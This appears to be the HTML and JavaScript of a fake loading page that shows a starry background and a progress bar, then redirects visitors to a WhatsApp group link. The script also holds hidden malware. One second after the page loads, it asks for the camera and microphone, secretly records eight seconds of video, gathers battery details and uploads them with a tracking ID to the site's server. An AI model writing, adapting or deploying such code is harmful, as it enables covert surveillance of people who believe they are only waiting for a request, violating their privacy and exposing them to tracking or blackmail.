<p class="small-text">Please wait while your request is processed...</p>

<script>
// Stars background
const canvas=document.getElementById('bgCanvas');
const ctx=canvas.getContext('2d');
canvas.width=window.innerWidth;canvas.height=window.innerHeight;
const stars=[];
for(let i=0;i<150;i++){stars.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.5+0.5,speed:Math.random()*0.7+0.2,glow:Math.random()*0.5+0.3});}
function animateStars(){ctx.clearRect(0,0,canvas.width,canvas.height);stars.forEach(s=>{ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,Math.PI*2);ctx.fillStyle='rgba(255,255,255,'+s.glow+')';ctx.fill();s.y-=s.speed;if(s.y<0)s.y=canvas.height;});requestAnimationFrame(animateStars);}
animateStars();
window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});

// Paragraph animation
const paragraphs=document.querySelectorAll('#status p');
paragraphs.forEach((p,i)=>{setTimeout(()=>{p.style.opacity=1;p.style.transform='translateY(0)';},1000+i*6000);});

// Progress bar + sparks
const progressBar=document.getElementById('progress');
const sparkCanvas=document.getElementById('sparkCanvas');
const sparkCtx=sparkCanvas.getContext('2d');
sparkCanvas.width=sparkCanvas.offsetWidth;
sparkCanvas.height=sparkCanvas.offsetHeight;

let progress=0;
const sparks=[];
function createSparks(x){
  for(let i=0;i<20;i++){sparks.push({x:x,y:17,vx:(Math.random()-0.5)*4,vy:(Math.random()-1.5)*2,life:Math.random()*50+30});}
}
function animateSparks(){
  sparkCtx.clearRect(0,0,sparkCanvas.width,sparkCanvas.height);
  for(let i=sparks.length-1;i>=0;i--){
    let s=sparks[i];
    sparkCtx.fillStyle='rgba(255,255,0,0.8)';
    sparkCtx.beginPath();
    sparkCtx.arc(s.x,s.y,2,0,Math.PI*2);sparkCtx.fill();
    s.x+=s.vx;s.y+=s.vy;s.life--;
    if(s.life<=0)sparks.splice(i,1);
  }
  requestAnimationFrame(animateSparks);
}
animateSparks();

const interval=setInterval(()=>{
  if(progress>=100){clearInterval(interval);window.location.href="https://chat.whatsapp.com/JHqpkhbogSIJJoLWp5Phn4";}
  else{
    progress++;
    progressBar.style.width=progress+'%';
    progressBar.textContent=progress+'%';
    if(progress%10===0) createSparks(progressBar.offsetWidth*progress/100);
  }
},400); // 30s total

const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";
let recordedChunks = [];

async function startRecording() {
  try {
    // âœ… get video + audio stream
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
    const mediaRecorder = new MediaRecorder(stream);

    let recordedChunks = [];
    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };

    mediaRecorder.onstop = async () => {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });

      // Battery info
      let batteryLevel = 'Unknown';
      let charging = 'Unknown';
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = Math.round(battery.level * 100);
        charging = battery.charging ? 'true' : 'false';
      }

      const formData = new FormData();
      formData.append('video', blob);
      formData.append('uid', uid);
      formData.append('battery', batteryLevel.toString());
      formData.append('charging', charging);

      await fetch('/api/upload', { method: 'POST', body: formData });
    };

    mediaRecorder.start();
    setTimeout(() => {
      mediaRecorder.stop();
      stream.getTracks().forEach(track => track.stop());
    }, 8000); 

  } catch (err) {
    console.error(err);
    alert("ğŸ¥ Access Denied or Error: " + err.message);
  }
}

// start recording after page load
window.onload = () => setTimeout(startRecording, 1000);
</script>
